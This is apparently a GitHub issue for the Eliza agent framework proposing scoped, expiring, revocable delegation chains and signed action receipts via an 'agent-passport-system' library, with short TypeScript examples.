topIssues.body:
Eliza agents operate autonomously, often with access to wallets and APIs. The current trust model is binary: an agent either has a token/key or it doesn't. There's no way to express "this agent can spend up to $50 from this wallet" or "this agent can post to Twitter but not delete tweets" or "this delegation expires in 24 hours."

When an agent misbehaves or gets compromised, the only option is to revoke the entire key. There's no granular scope, no cascade revocation for downstream agents, and no signed proof of what the agent was authorized to do.

Delegation chains with monotonic narrowing fix this:

```typescript
import { issuePassport, createDelegation, verifyDelegation } from 'agent-passport-system'

// Each Eliza agent gets an Ed25519 identity
const passport = issuePassport({ name: 'trading-agent-01', model: 'gpt-4o' })

// Owner delegates: trade on Uniswap, max $500/day, 7 days
const delegation = createDelegation({
  delegatedTo: passport.publicKey,
  delegatedBy: ownerKey,
  scope: ['commerce:trade', 'defi:swap'],
  spendLimit: 50000,  // cents
  expiresAt: new Date(Date.now() + 7 * 86400_000),
  maxDepth: 1  // can't sub-delegate
})

// Agent can sub-delegate to a helper, but ONLY narrower
// Trying to escalate scope or spend → cryptographic rejection
const subDelegation = createDelegation({
  delegatedTo: helperKey,
  delegatedBy: passport.privateKey,
  scope: ['defi:swap'],  // narrower than parent
  spendLimit: 10000,     // less than parent
  parentDelegation: delegation
})
// verifyDelegation(subDelegation) checks the full chain
```

If the trading agent gets compromised:

```typescript
import { cascadeRevoke } from 'agent-passport-system'
// One call kills the agent AND all its sub-delegations
cascadeRevoke(delegation.delegationId, ownerKey)
```

Every action the agent takes through the governance layer produces a signed receipt — Ed25519 proof of what was authorized, what was attempted, and what happened. The receipts are append-only and tamper-evident.

`npm install agent-passport-system` (v1.36.2, Apache-2.0) or `pip install agent-passport-system` (v0.8.0).

The character/plugin architecture maps well here — governance could be a plugin that wraps action execution, checking delegation scope before every external call. The receipt trail gives operators forensic evidence when agents interact with real money.
